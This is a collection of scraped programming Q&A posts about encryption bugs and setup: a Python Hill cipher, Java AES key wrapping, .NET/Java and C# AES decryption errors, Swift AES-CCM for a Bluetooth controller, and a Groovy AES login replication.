    splittingNumsresult = []
    for i in range(len(messagenum)):
        if i % 2 == 0:
            splittingNumsresult.append([messagenum[i], messagenum[i+1]])
    return splittingNumsresult
def matrixmultiplication2x2and2x1(keymatrix, textmatrix):
    return [keymatrix[0][0]*textmatrix[0] + keymatrix[0][1]*textmatrix[1], keymatrix[1][0]*textmatrix[0] + keymatrix[1][1]*textmatrix[1]]



def encryption(message, keymatrix):
    messagenum = text2num(message)
    messagenumsplit = splittingNums(messagenum)
    resultantmatrix = []
    resultantnumber = &quot;&quot;
    for i in messagenumsplit:
        resultantmatrix.append(matrixmultiplication2x2and2x1(keymatrix, i))
    for x in resultantmatrix:
        for y in x:
            resultantnumber += str(y) + &quot; &quot;
    return resultantnumber[0:-1]

def decryption(messagenum, keymatrix):
    messagenumsplit = splittingNums(messagenum)
    resultantmatrix = []
    det = keymatrix[0][0]*keymatrix[1][1] - keymatrix[1][0]*keymatrix[0][1]
    invkeymatrix = [
        [keymatrix[1][1]/float(det), -keymatrix[0][1]/float(det)],
        [-keymatrix[1][0]/float(det), keymatrix[0][0]/float(det)]
    ]
    for i in messagenumsplit:
        resultantmatrix.extend(matrixmultiplication2x2and2x1(invkeymatrix, i))
    textresult = num2text(resultantmatrix)
    return textresult
    


while True:
    choice = input(&quot;I want to: decrypt(d) | encrypt(e):&quot;)
    key = input(&quot;Please enter your keymatrix(2x2) as each number serperated by a space:&quot;)
    key = list(map(int, key.split(&quot; &quot;)))
    keymatrix = [
        [key[0], key[1]],
        [key[2], key[3]]
    ]
    if choice.lower() == &quot;e&quot;:
        message = input(&quot;Message:&quot;).strip()
        if len(message) % 2 != 0:
            message += &quot; &quot;
        result = encryption(message, keymatrix)
        pyperclip.copy(result)
    elif choice.lower() == &quot;d&quot;:
        messagenum = input(&quot;Enter your numbers, with space in between:&quot;).strip()
        messagenum = list(map(int, messagenum.split(&quot; &quot;)))
        result = decryption(messagenum, keymatrix)
    print(result)




# This program can only handle 1 degit inverse matrix for some reason idk why
</code></pre>
<p>The above code work if my key is 1 digit like this:</p>
<p><strong>Case1(1 digit keys)</strong></p>
<blockquote>
</blockquote>
<p>I want to: decrypt(d) | encrypt(e):e
Please enter your keymatrix(2x2) as each number serperated by a space:<strong>1 2 1 3</strong>
Message:<strong>attack</strong>
41 61 22 23 25 36
I want to: decrypt(d) | encrypt(e):d
Please enter your keymatrix(2x2) as each number serperated by a space:<strong>1 2 1 3</strong>
Enter your numbers, with space in between:41 61 22 23 25 36
<strong>ATTACK</strong></p>
<blockquote>
</blockquote>
<p><strong>Why does this inverse matrix encryption, decryption not work with more than 1 digit matrix as a key?
if I use key that is large, like this:</strong>
**
Case2(multiple digis keys)**</p>
<blockquote>
</blockquote>
<p>I want to: decrypt(d) | encrypt(e):e
Please enter your keymatrix(2x2) as each number serperated by a space:<strong>421 7842 10312 85983</strong>
Message:<strong>attack now</strong>
157261 1729972 16262 292223 87525 976749 121155 1482186 186681 2132289
I want to: decrypt(d) | encrypt(e):d
Please enter your keymatrix(2x2) as each number serperated by a space:<strong>421 7842 10312 85983</strong>
Enter your numbers, with space in between:157261 1729972 16262 292223 87525 976749 121155 1482186 186681 2132289
<strong>AACO</strong></p>
<blockquote>
</blockquote>
<p>The answer would be AACO compared to ATTACK NOW, which is completely wrong. I can't figure out why this is.</p>
<p>Asked AI and it doesn't seems to know how to fix it either, all attempts failed.
First change i made was to use float in the inv matrix.
Second change tried to make was using decrypt like this:</p>
<pre><code>def decryption(messagenum, keymatrix):
    messagenumsplit = splittingNums(messagenum)
    resultantmatrix = []
    det = keymatrix[0][0]*keymatrix[1][1] - keymatrix[1][0]*keymatrix[0][1]
    invkeymatrix = [
        [keymatrix[1][1]/float(det), -keymatrix[0][1]/float(det)],
        [-keymatrix[1][0]/float(det), keymatrix[0][0]/float(det)]
    ]
    for i in messagenumsplit:
        decrypted_pair = matrixmultiplication2x2and2x1(invkeymatrix, i)
        resultantmatrix.append(decrypted_pair)
    textresult = num2text([num for pair in resultantmatrix for num in pair])
    return textresult
</code></pre>
<p>But it didn't seems to fix anything. so i reverted back
Third, thought i did use a weird method of adding space to odd letters, it seems to function fine.</p>
<p>Now I am not sure if it the problem with encrypt or decrpyt that gives me the wrong text.</p>
"
"<p>Error: Bootloader binary size 0x7780 bytes is too large for partition table offset 0x8000. Bootloader binary can be maximum 0x7000 (28672) bytes unless the partition table offset is increased in the Partition Table section of the project configuration menu.</p>
<p>Enabling flash encryption in esp32 firmware.</p>
"
"<p>I want to enable TLS Cipher <code>TLS_RSA_WITH_AES_128_GCM_SHA256</code> on Windows 2016 to test IBM MQ client connectivity. It seems this exact name is not available on Windows and the equivalent is <code>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</code> as mentioned on following page:</p>
<p><code>https://learn.microsoft.com/en-us/windows/win32/secauthn/tls-cipher-suites-in-windows-10-v1607</code></p>
<p>Shall I enable the equivalent cipher or is there a way to enable the exact one I mentioned above?</p>
<p>I actually tried to enable using <code>Enable-TlsCipherSuite</code> command in Powershell but IBM MQ client didn't connect. So I am not sure if this is something that can be enabled using Powershell or shall I ask Infrastructure guys to apply Windows Group policy?</p>
"
"<p>I am trying AES key wrapping using another AES key and unwrapping to get the original key <em>(RFC 3394 and RFC 5649)</em>. The way of wrapping and unwrapping the key is as follows:</p>
<p><strong>Key wrapping</strong></p>
<ol>
<li>Convert into byte[]</li>
<li>Wrap using AES</li>
</ol>
<ul>
<li>Get Cipher instance <code>Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);</code></li>
<li>Generate IvParameterSpec</li>
<li>Create a SecretKey object from the wrapper key
<code>SecretKey secretKey = new SecretKeySpec(wrapperKey, &quot;AES&quot;);</code></li>
<li>Initialize the cipher for encryption
<code>cipher.init(Cipher.WRAP_MODE, secretKey, iv);</code></li>
<li>Perform wrapping <code>byte[] wrappedKey = cipher.wrap(new SecretKeySpec(keyToWrap, &quot;AES&quot;));</code></li>
<li>return wrapped key</li>
</ul>
<p><strong>Key unwrapping</strong></p>
<ol>
<li>Convert wrapped key to byte[]</li>
<li>Unwrap using AES</li>
</ol>
<ul>
<li>Get Cipher instance <code>Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);</code></li>
<li>Extract IV (16 bytes)</li>
<li>Create a SecretKey object from the wrapper key
<code>SecretKey secretKey = new SecretKeySpec(wrapperKey, &quot;AES&quot;);</code></li>
<li>Initialize the cipher for encryption
<code>cipher.init(Cipher.UNWRAP_MODE, secretKey , iv);</code></li>
<li>Perform unwrapping <code>Key unwrappedKey = cipher.unwrap(wrappedKey, &quot;AES&quot;, Cipher.SECRET_KEY);</code></li>
</ul>
<p><strong>Problem</strong></p>
<p>The issue I am facing while unwrapping is that I am not getting the original key back and the difference is caused by first 16 bytes in byte array which is the size of IV. I debugged but couldn't find the reason causing this.</p>
<p>Dependencies used</p>
<p><code>SunJCE: Cipher.AES -&gt; com.sun.crypto.provider.AESCipher$General aliases: [Rijndael]</code></p>
<p>Below is the output.</p>
<p>1.
Original Key: <code>00112233445566778899aabbccddeeff</code></p>
<p>Original Key in byte[] : <code>[-45, 77, 117, -37, 109, -9, -29, -114, 121, -21, -82, -5, -13, -49, 125, 105, -90, -37, 113, -57, 93, 121, -25, -33]</code></p>
<p>Original IV : <code>[-76, 50, 106, -33, -77, -80, -90, 53, -11, -91, 17, 25, -21, -63, -57, 17]</code></p>
<p>2.</p>
<p>Wrapped Key : <code>gxLT9+PTn8rikNLJnK1RcpNqFIL/fG7EPLVsIr5mwOA=</code></p>
<p>wrapped key in byte[] : <code>[113, 0, 125, 123, 85, 97, 65, 123, 118, 91, -22, -117, 62, 37, 117, -11, -119, 98, -128, 16, -85, -51, -47, 109, -15, -65, 123, -89, -92, -81, -78, 38]</code></p>
<p>IV from wrapped key : <code>[113, 0, 125, 123, 85, 97, 65, 123, 118, 91, -22, -117, 62, 37, 117, -11]</code></p>
<p>3.</p>
<p>Unwrapped Key: <code>RhzNRM6VgeHUTAkIpYfHnqbbccddeeff</code></p>
<p>Unwrapped Key byte[]: <code>[22, 127, 98, 127, -117, 38, 4, -64, -6, 21, 85, 105, 38, 43, -49, -115, -90, -37, 113, -57, 93, 121, -25, -33]</code></p>
<p>=============================================</p>
<p>Diff seems to be due to 16 bytes (the size of IV)</p>
<p>org key : <code>[-45, 77, 117, -37, 109, -9, -29, -114, 121, -21, -82, -5, -13, -49, 125, 105, -90, -37, 113, -57, 93, 121, -25, -33]</code></p>
<p>output key : <code>[22, 127, 98, 127, -117, 38, 4, -64, -6, 21, 85, 105, 38, 43, -49, -115, -90, -37, 113, -57, 93, 121, -25, -33]</code></p>
<p>Adding code :</p>
<pre><code>import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.Key;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Base64;

public class KeyWrapping {

    public static void main(String[] args) throws Exception {

        String originalKeyHex = &quot;00112233445566778899aabbccddeeff&quot;;
        String wrappingKeyHex = &quot;000102030405060708090a0b0c0d0e0f&quot;;

        // converting hex strings to byte arrays
        byte[] originalKey = hexStringToByteArray(originalKeyHex);
        byte[] wrapperKey = hexStringToByteArray(wrappingKeyHex);

        // Encrypt the key
        byte[] wrappedKey = aesKeyWrapEncrypt(originalKey, wrapperKey);

        // Decrypt the key
        byte[] unwrappedKey = aesKeyWrapDecrypt(wrappedKey, wrapperKey);

        // Display results
        System.out.println(&quot;Original Key: &quot; + byteArrayToHexString(originalKey));
        System.out.println(&quot;Wrapped Key : &quot; + byteArrayToHexString(wrappedKey));
        System.out.println(&quot;Unwrapped Key: &quot; + byteArrayToHexString(unwrappedKey));
    }

    // AES Key Wrap Encryption
    private static byte[] aesKeyWrapEncrypt(byte[] keyToWrap, byte[] wrapperKey) throws Exception {
    
        Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);

        // Generate a random Initialization Vector (IV)
        SecureRandom random = new SecureRandom();
        byte[] ivBytes = new byte[16];
        random.nextBytes(ivBytes);
        IvParameterSpec iv = new IvParameterSpec(ivBytes);

        // Create a SecretKey object from the wrapper key
        SecretKey secretKey = new SecretKeySpec(wrapperKey, &quot;AES&quot;);

        // Initialize the cipher for encryption
        cipher.init(Cipher.WRAP_MODE, secretKey, iv);


        // Encrypt the key
        byte[] wrappedKey = cipher.wrap(new SecretKeySpec(keyToWrap, &quot;AES&quot;));

        return wrappedKey;

    }

    // AES Key Wrap Decryption
    private static byte[] aesKeyWrapDecrypt(byte[] wrappedKey, byte[] wrappingKey) throws Exception {

        Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);

        // Extract the Initialization Vector (IV) from the wrapped key
        byte[] ivBytes = new byte[16];
        System.arraycopy(wrappedKey, 0, ivBytes, 0, ivBytes.length);
        IvParameterSpec iv = new IvParameterSpec(ivBytes);

        // Create a SecretKey object from the wrapping key
        SecretKey secretKey = new SecretKeySpec(wrappingKey, &quot;AES&quot;);

        // Initialize the cipher for decryption
        cipher.init(Cipher.UNWRAP_MODE, secretKey, iv);

        // Decrypt the key
        Key unwrappedKey = cipher.unwrap(wrappedKey, &quot;AES&quot;, Cipher.SECRET_KEY);

        return unwrappedKey.getEncoded();
    }



    // Helper method to convert byte array to hex string
    private static String byteArrayToHexString(byte[] array) {
        return Base64.getEncoder().encodeToString(array);
    }

    // Helper method to convert hex string to byte array
    private static byte[] hexStringToByteArray(String hexString) {
        return Base64.getDecoder().decode(hexString);
    }
}
</code></pre>
<p><strong>Update :</strong></p>
<p>Thanks @President James K. Polk for pointing out the exact issue. It worked with below fix.</p>
<pre><code>    // AES Key Wrap Encryption
    private static byte[] aesKeyWrapEncrypt(byte[] keyToWrap, byte[] wrapperKey) throws Exception {
...

            byte[] wrappedKey = cipher.wrap(new SecretKeySpec(keyToWrap, &quot;AES&quot;));
    
            // prepending the IV to the wrapped key
            byte[] result = new byte[ivBytes.length + wrappedKey.length];
            System.arraycopy(ivBytes, 0, result, 0, ivBytes.length);
            System.arraycopy(wrappedKey, 0, result, ivBytes.length, wrappedKey.length); 
...
</code></pre>
"
"<p>I'm bulding an application that Encrypt in .NET and decrypt on Android App.</p>
<p>To test the correcteness of .NET, I also develope the Decrypt method on .NET, which is basically:</p>
<pre><code>public static byte[] DecryptStreamWithEmbeddedHash(Stream inputStream, string password)
{
    const int iterations = 10000;
    const string customSalt = &quot;myCustomSalt&quot;;
    static HashAlgorithmName hashAlgorith = HashAlgorithmName.SHA256;
    byte[] salt = Encoding.ASCII.GetBytes(password + customSalt);

    using (var aesAlg = Aes.Create())
    {
        using (var keyDerivation = new Rfc2898DeriveBytes(password, salt, iterations, hashAlgorith))
        {
            aesAlg.Key = keyDerivation.GetBytes(32);
            aesAlg.IV = keyDerivation.GetBytes(16);

            // read hash length
            byte[] hashLengthBytes = new byte[sizeof(int)];
            inputStream.Read(hashLengthBytes, 0, sizeof(int));
            int hashLength = BitConverter.ToInt32(hashLengthBytes, 0);

            // read hash
            byte[] embeddedHash = new byte[hashLength];
            inputStream.Read(embeddedHash, 0, hashLength);

            // decrypt content
            using (var cryptoStream = new CryptoStream(inputStream, aesAlg.CreateDecryptor(), CryptoStreamMode.Read))
            using (var memoryStream = new MemoryStream())
            {
                cryptoStream.CopyTo(memoryStream);
                return memoryStream.ToArray();
            }
        }
    }
}
</code></pre>
<p>Here's my attempt on Java:</p>
<pre><code>public static byte[] decryptStreamWithEmbeddedHash(InputStream inputStream, String password) throws Exception {
    int iterations = 10000;
    String customSalt = &quot;myCustomSalt&quot;;
    String hashAlgorithm = &quot;SHA-256&quot;;
    byte[] salt = (password + customSalt).getBytes(StandardCharsets.US_ASCII);

    SecretKeyFactory factory = SecretKeyFactory.getInstance(&quot;PBKDF2WithHmacSHA1&quot;);
    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, iterations, 256);
    SecretKey tmp = factory.generateSecret(spec);
    SecretKey secret = new SecretKeySpec(tmp.getEncoded(), &quot;AES&quot;);
    byte[] iv = Arrays.copyOfRange(salt, 0, 16); // IV is the first 16 bytes of salt

    // read hash length
    byte[] hashLengthBytes = new byte[4]; // sizeof(int)
    inputStream.read(hashLengthBytes, 0, 4);
    int hashLength = ByteBuffer.wrap(hashLengthBytes).order(ByteOrder.LITTLE_ENDIAN).getInt();

    // read hash
    byte[] embeddedHash = new byte[hashLength];
    inputStream.read(embeddedHash, 0, hashLength);

    // decrypt content
    Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);
    cipher.init(Cipher.DECRYPT_MODE, secret, new IvParameterSpec(iv));
    ByteArrayOutputStream decryptedStream = new ByteArrayOutputStream();
    try (CipherInputStream cryptoStream = new CipherInputStream(inputStream, cipher)) {
        byte[] buffer = new byte[8192];
        int len;
        while ((len = cryptoStream.read(buffer)) &gt; 0) {
            decryptedStream.write(buffer, 0, len);
        }
    } catch (Exception err) {
        err.printStackTrace();
    }
    byte[] decryptedData = decryptedStream.toByteArray();

    // verify hash
    MessageDigest md = MessageDigest.getInstance(hashAlgorithm);
    byte[] calculatedHash = md.digest(decryptedData);
    if (!Arrays.equals(calculatedHash, embeddedHash)) {
        throw new Exception(&quot;Hash verification failed.&quot;);
    }

    return decryptedData;
}
</code></pre>
<p>but on:</p>
<pre><code>while ((len = cryptoStream.read(buffer)) &gt; 0) {
    decryptedStream.write(buffer, 0, len);
}
</code></pre>
<p>at some point I got this:<code>java.io.IOException: javax.crypto.IllegalBlockSizeException: error:1e00007b:Cipher functions:OPENSSL_internal:WRONG_FINAL_BLOCK_LENGTH</code></p>
<p>Am I not really sure what's the concrete cause. Going in debug indexes and position of stream seems correct?</p>
<p>Any clues?</p>
"
"<p>I am not sure what I am asking for so please bear with me.</p>
<p>how can I implement in ruby scenario like this:</p>
<p>user have some kind of sensitive information, e.g. <code>{ token: &quot;blabla&quot;, email: &quot;blabal@blabal.com&quot;}</code>
now, the user should use some kind of procedure to encrypt the data and upload them to the server/database.</p>
<p>now, the web application should use the information to connect to another app and should be able to decrypt the data in order to use them, so probably the app need to have some kind of second key to decrypt the info.</p>
<p>i dont know if I am clear on this, please ask any question. Thank you for any suggestion and information.</p>
<p>I am expeting code/hints/aditional information/tools to use in order to solve my problem.</p>
"
"<p>I'm looking into Zitadel, trying to follow this guide here:
<a href=""https://zitadel.com/docs/examples/login/go"" rel=""nofollow noreferrer"">https://zitadel.com/docs/examples/login/go</a></p>
<p>At the end this requires me to have an aes encryption key:</p>
<p>from the example:
<code>go run main.go --domain my-domain.zitadel.cloud --key XKv2Lqd7YAq13NUZVUWZEWZeruqyzViM --clientID 243861220627644836@example --redirectURI http://localhost:8089/auth/callback</code></p>
<p>But I have not seen where can I obtain such key? I went through the docs, but have not seen anything for this issue.</p>
<p>Trying to leave it empty, I receive this error:
<code>crypto/aes: invalid key size 0</code> which I guess is from Go. Writing a 32 byte long random something in it will result: <code>{&quot;error&quot;:&quot;invalid_request&quot;,&quot;error_description&quot;:&quot;Errors.App.NotFound&quot;}</code></p>
<p>The only thing I have found is a master key setting, but I'm not self hosting.</p>
<p>also the docs say:
<code>key: The path to the downloaded key.json</code>
But the guide never mentioned downloading any json, nor do I see the option to it with webapp.</p>
"
"<p>I'm trying to decrypt a message in Swift that is sent from a device which I've connected via Bluetooth.</p>
<p>I'm trying to make a swift implementation of this article:</p>
<p><a href=""https://www.makinolo.com/blog/2023/10/08/connecting-to-zwift-play-controllers/"" rel=""nofollow noreferrer"">https://www.makinolo.com/blog/2023/10/08/connecting-to-zwift-play-controllers/</a></p>
<p>I've created a symmetric key through the following steps:</p>
<pre><code>let privateKey = P256.KeyAgreement.PrivateKey()
var message = &quot;RideOn&quot;.data(using: .utf8)!
message.append(Data([0x01, 0x09]))
let publicKey = privateKey.publicKey
message.append(publicKey.rawRepresentation)
/// sent to peripheral
</code></pre>
<p>I receive their public key and create the shared secret</p>
<pre><code>        let rideOn = &quot;RideOn&quot;.data(using: .utf8)!

        guard value.starts(with: rideOn) else {
            logger.error(&quot;no ride on?&quot;)
            return
        }

        let key = value.dropFirst(8)

        guard let publicKey = try? P256.KeyAgreement.PublicKey(rawRepresentation: key) else {
            logger.debug(&quot;wrong key?&quot;)
            return
        }

        let salt = key + privateKey.publicKey.rawRepresentation

        guard let sharedSecret = try? privateKey.sharedSecretFromKeyAgreement(with: publicKey) else {
            logger.debug(&quot;no shared secret&quot;)
            return
        }
        let symmetricKey = sharedSecret.hkdfDerivedSymmetricKey(using: SHA256.self, salt: salt, sharedInfo: Data(), outputByteCount: 36)
</code></pre>
<p>I start receiving messages, but I cannot get the messages to decode. These steps do not seem to work for iOS, because of a difference nonce maybe?</p>
<pre><code>For decryption you need to extract the 3 parts of the message and call the AES-CCM decrypt function with:

- The AES mode, which is aes-256-ccm
- The IV (initialization Vector) also called nonce (number used once) which is an 8 byte array whose 4 first bytes are the 4 last bytes of the HKDF symmetric key, followed by the 4 bytes of the counter you have received in the message.
The IV / nonce length, which is 8 bytes
- The received MIC, so the algorithm can compare his own calculated MIC with the one provided and authenticate the message
- The received message (only the remaining bytes in the message after stripping the counter and the MIC)
</code></pre>
<p>I've tried the following:</p>
<p>Using cryptoswift:</p>
<pre><code>        let nonceData = symmetricKey.withUnsafeBytes { Data(Array($0)) }[...3] + value[...3]
        let tag = value.suffix(4)
        var value = value
        value = value.dropFirst(4)
        value.removeLast(4)

        do {
            let aes = try AES(key: symmetricKey.withUnsafeBytes { Array($0) }, blockMode: CCM(iv: [UInt8](nonceData), tagLength: 4, messageLength: value.count), padding: .zeroPadding)
            let result = try aes.decrypt([UInt8](value))

            print(&quot;Result: \(result)&quot;)
        } catch {
            logger.debug(&quot;Error: \(error.localizedDescription)&quot;)
        }
</code></pre>
<p>using CryptoKit</p>
<pre><code>        do {
            let nonce = try AES.GCM.Nonce(data: nonceData)

            let sealedBox = try AES.GCM.SealedBox(nonce: nonce, ciphertext: value, tag: tag)
            let result = try AES.GCM.open(sealedBox, using: symmetricKey)

        } catch {
            logger.debug(&quot;\(error.localizedDescription)&quot;)
        }
</code></pre>
<p>I think there is a problem with creating the Nonce, but no real clue, not really familiar with encryption/decryption.</p>
<p>This is a couple of the messages I receive:</p>
<pre><code>Own private key: [36, 147, 90, 234, 66, 250, 58, 153, 187, 163, 237, 184, 100, 91, 99, 35, 139, 69, 181, 239, 250, 214, 164, 116, 118, 58, 95, 218, 28, 25, 111, 105]
Own public key: [34, 76, 142, 17, 129, 101, 252, 53, 92, 200, 144, 34, 20, 43, 115, 100, 181, 27, 19, 176, 145, 253, 34, 241, 74, 107, 125, 254, 130, 146, 169, 65, 118, 6, 199, 146, 89, 20, 47, 233, 101, 134, 76, 192, 61, 167, 135, 89, 100, 140, 56, 63, 3, 117, 57, 52, 136, 220, 38, 44, 119, 8, 110, 201]
Click key: [247, 134, 157, 189, 154, 129, 53, 47, 254, 165, 164, 49, 150, 55, 151, 75, 7, 182, 85, 194, 28, 198, 177, 153, 128, 75, 32, 50, 155, 204, 225, 201, 215, 241, 81, 246, 9, 222, 89, 81, 11, 190, 74, 214, 117, 41, 155, 227, 87, 41, 120, 34, 141, 227, 83, 85, 22, 246, 115, 0, 65, 174, 194, 48]
Salt: [247, 134, 157, 189, 154, 129, 53, 47, 254, 165, 164, 49, 150, 55, 151, 75, 7, 182, 85, 194, 28, 198, 177, 153, 128, 75, 32, 50, 155, 204, 225, 201, 215, 241, 81, 246, 9, 222, 89, 81, 11, 190, 74, 214, 117, 41, 155, 227, 87, 41, 120, 34, 141, 227, 83, 85, 22, 246, 115, 0, 65, 174, 194, 48]

After pressing click, a couple of the messages:
[21, 0, 0, 0, 248, 68, 228, 177, 135, 249, 158, 236, 165]
[22, 0, 0, 0, 78, 244, 116, 18, 109, 111, 238, 175, 86]
[23, 0, 0, 0, 122, 90, 33, 237, 14, 237, 234]
[24, 0, 0, 0, 139, 66, 8, 195, 217, 18, 234]
[25, 0, 0, 0, 3, 247, 14, 46, 58, 88, 71]

</code></pre>
"
"<p>I am currently working on an authentication from an external third party that sends us an encoded base64 string which we -in turn- should decode it and then, decrypt it to fetch the user claims. Here is the method I created in C# to decrypt the value we receive from them:</p>
<pre><code>var key = Encoding.UTF8.GetBytes(_secretKey);
byte[] iv;

using (var aesAlg = Aes.Create())
{
    var decodedBytes = Convert.FromBase64String(_jwtEncryptedToken);

    iv = new byte[16];
    Array.Copy(decodedBytes, 0, iv, 0, iv.Length);

    aesAlg.Key = key;
    aesAlg.IV = iv;
    aesAlg.Mode = CipherMode.CBC;
    aesAlg.Padding = PaddingMode.PKCS7;

    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);


    using (var msDecrypt = new MemoryStream(decodedBytes))
    {
        using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
        {
            using (var srDecrypt = new StreamReader(csDecrypt))
            {
                return srDecrypt.ReadToEnd();
            }
        }
    }
}
</code></pre>
<p>When I try to test it along with the encoded base64 I receive, it always returns an error saying that, &quot;Input data is not a complete block&quot;</p>
<p>P.S. The secret key is of a 16 characters and the _jwtEncryptedToken is the encoded base64 that I receive</p>
<p>Can anyone help with this?</p>
<p>Thanks in advance.</p>
"
"<p>Our small organization has been using Kleopatra and GnuPG in concert to manage keys and encrypt/decrypt vendor files for ETL data flows.  Our organization does not have a SME on encrypt/decrypt Best Practices so I have the honor of trying to figure this out and learn as I go.</p>
<p>I set up a Windows server with the tools to perform data flows using Powershell scripts leveraging WinSCP and GnuPG libraries to move encrypted data into and out of our network.  This method works but is not scalable. I am now building out a centralized Key/Cert/Secret platform leveraging Azure Key Vault.</p>
<p>We have a small collection of Public Keys from vendors, all in the ASC format: &quot;myVendor_publicKey.asc&quot;</p>
<p>Azure Key Vault requires &quot;.pfx&quot;, &quot;.pem&quot; or &quot;byok&quot; formats.</p>
<p>Google searches and S.O. searches has not yet revealed the answer to my specific question which is: <strong>Can I convert an .asc file to .pfx or .pem or .byok file type and if so, how and if not, are there alternatives?</strong></p>
<p>Thank you for your time and consideration.</p>
"
"<p>Our website is generating a dynamic loginkey which uses AES. Now, since I'm not using the encrypt.js code that they used on the website.</p>
<p>I tried to replicate this part of the code from the website using groovy:</p>
<pre><code>var type=&quot;DATABASE&quot;;
    a2 = encrypt.AESEncrypt(a2, &quot;&lt;%=(String)session.getAttribute(&quot;__GETLOGINKEY&quot;)%&gt;&quot;, 256);
    document.forms[0].a3.value = a2;
    document.forms[0].a2.value = a2n;
    document.forms[0].txtResFrac.value= screen.width;
    if (getControlPrefix.prefix){
        return getControlPrefix.prefix;
    }
</code></pre>
<p>I copied the code from <a href=""https://groovy.apache.org/blog/encryption-and-decryption-with-groovy"" rel=""nofollow noreferrer"">https://groovy.apache.org/blog/encryption-and-decryption-with-groovy</a> and replace the var text with</p>
<pre><code>var a2 = vars.get('password'); &lt;&lt; taken from the user-defined variables
var a3 = &quot;&quot;; &lt;&lt; this is the parameter from the website login page
</code></pre>
<p>I'm passing the encrypted value using this code because I need to pass it back to the website as a loginkey</p>
<pre><code>vars.put(&quot;a3&quot;,&quot;${new String(encrypted)}&quot;);
</code></pre>
<p>The website reads the value as</p>
<pre><code>userid=PERFUNIADM05
password=Password_1 &lt;&lt; This is user-defined variable
a2=********** &lt;&lt; This is the masked password from user-defined variable  
a3=h(Dl�cg[25�z3h &lt;&lt; This is the encrypted value using the code from this https://groovy.apache.org/blog/encryption-and-decryption-with-groovy.
This is being pass to the application server for authentication.
But since it cannot read it, the application is throwing an error.
encryption=EBWZJQ7XNGJN53MN7I50N2XQJ71T9LK3 &lt;&lt; This key came from the Welcome.do page generated from encrypt.js embedded in the page.
</code></pre>
<p>This is the error from the server.log</p>
<pre><code>29.02.2024 23:21:21,133 DEBUG [org.apache.coyote.http11] JBWEB003028: Start processing with input [txtUserid=PERFUNIADM06&amp;a2=**********
&amp;**a3=%07%EF%BF%BDC%05%2F%EF%BF%BD%EF%BF%BD%60%EF%BF%BD%EF%BF%BD%C6%B6%EF%BF%BD3%09%EF%BF%BD**&amp;txtpasswd=I+am+an+idiot.&amp;cmbOrgCodes=001&amp;submit=Sign+in&amp;txtResFrac=1920]
29.02.2024 23:21:21,133 INFO  [org.apache.catalina.core.ContainerBase.[jboss.web].[default-host].[/collections]] (http-/0.0.0.0:50443-17) I am in Timer Filter 
29.02.2024 23:21:21,133 DEBUG [org.apache.struts.util.RequestUtils] Get module name for path /loginAction.do
29.02.2024 23:21:21,133 DEBUG [org.apache.struts.util.RequestUtils] Module name found: default
29.02.2024 23:21:21,133 DEBUG [org.apache.struts.action.RequestProcessor] Processing a 'POST' for path '/loginAction'
29.02.2024 23:21:21,133 DEBUG [org.apache.struts.util.RequestUtils] Looking for ActionForm bean instance in scope 'session' under attribute key 'personalizeActionform'
29.02.2024 23:21:21,133 DEBUG [org.apache.struts.util.RequestUtils] Recycling existing DynaActionForm instance of type 'personalizeActionform'
29.02.2024 23:21:21,133 DEBUG [org.apache.struts.action.RequestProcessor] Storing ActionForm bean instance in scope 'session' under attribute key 'personalizeActionform'
29.02.2024 23:21:21,133 DEBUG [org.apache.struts.action.RequestProcessor] Populating bean properties from this request
29.02.2024 23:21:21,133 DEBUG [org.apache.commons.beanutils.BeanUtils] BeanUtils.populate(DynaActionForm[dynaClass=personalizeActionform,a1=,a2=,a3=,txtpasswd=,txtUserid=,cmblayout=,cmbOrgCodes=,txtMenuCode=,txtResFrac=,cmblocale=,txtMultipleOrg=,cmbtemplates=], {a2=[Ljava.lang.String;@7a6fe440, a3=[Ljava.lang.String;@5cfc5339, txtpasswd=[Ljava.lang.String;@2212b535, txtUserid=[Ljava.lang.String;@2b9b67ba, submit=[Ljava.lang.String;@2ed3cb6d, cmbOrgCodes=[Ljava.lang.String;@10083015, txtResFrac=[Ljava.lang.String;@2784843c})
29.02.2024 23:21:21,133 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string '**********' to class 'java.lang.String'
29.02.2024 23:21:21,133 DEBUG [org.apache.commons.beanutils.ConvertUtils] **Convert string '�C/��`��ƶ�3 �' to class 'java.lang.String'**
29.02.2024 23:21:21,133 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string 'I am an idiot.' to class 'java.lang.String'
29.02.2024 23:21:21,133 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string 'PERFUNIADM06' to class 'java.lang.String'
29.02.2024 23:21:21,133 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string '001' to class 'java.lang.String'
29.02.2024 23:21:21,133 DEBUG [org.apache.commons.beanutils.ConvertUtils] Convert string '1920' to class 'java.lang.String'
29.02.2024 23:21:21,133 DEBUG [org.apache.struts.action.RequestProcessor] Looking for Action instance for class indus.collproj.action.security.LoginAction
29.02.2024 23:21:21,133 ERROR [stderr] java.lang.StringIndexOutOfBoundsException: String index out of range: 15
29.02.2024 23:21:21,134 ERROR [stderr]  at java.lang.String.charAt(String.java:658)
29.02.2024 23:21:21,134 ERROR [stderr]  at indus.common.security.aas.AES_Algorithm.decodeBase64(AES_Algorithm.java:352)
29.02.2024 23:21:21,134 ERROR [stderr]  at indus.common.security.aas.AES_Algorithm.AESDecrypt(AES_Algorithm.java:250)
29.02.2024 23:21:21,134 ERROR [stderr]  at indus.collproj.action.security.LoginAction.login(LoginAction.java:95)
</code></pre>
<p>What should I do to get a key readable by the website in order to properly authenticate it?</p>
<p>encrypt.js</p>
<pre><code>var encrypt = {
Sbox: [99,..],
Rcon: [[0, 0, 0, 0],..,
b64: &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;
